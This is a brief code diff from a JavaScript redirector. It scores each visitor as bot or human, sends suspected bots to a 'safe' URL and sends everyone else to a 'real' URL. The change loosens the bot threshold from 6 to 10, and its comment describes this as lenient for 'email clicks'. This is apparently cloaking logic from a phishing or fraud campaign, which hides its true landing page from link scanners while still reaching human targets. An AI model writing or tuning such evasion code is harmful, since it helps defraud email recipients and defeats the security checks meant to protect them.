@@ -87,8 +87,8 @@
                 const realUrl = baseReal + jsParam + delayParam + interactionParam;
                 const safeUrl = baseSafe;
 
-                // Redirect based on bot score (threshold: 6, very VPN-friendly)
-                location.href = s >= 6 ? safeUrl : realUrl;
+                // Redirect based on bot score (threshold: 10, very lenient for email clicks)
+                location.href = s >= 10 ? safeUrl : realUrl;
             };
 
             // Minimum delay before redirect - faster for users
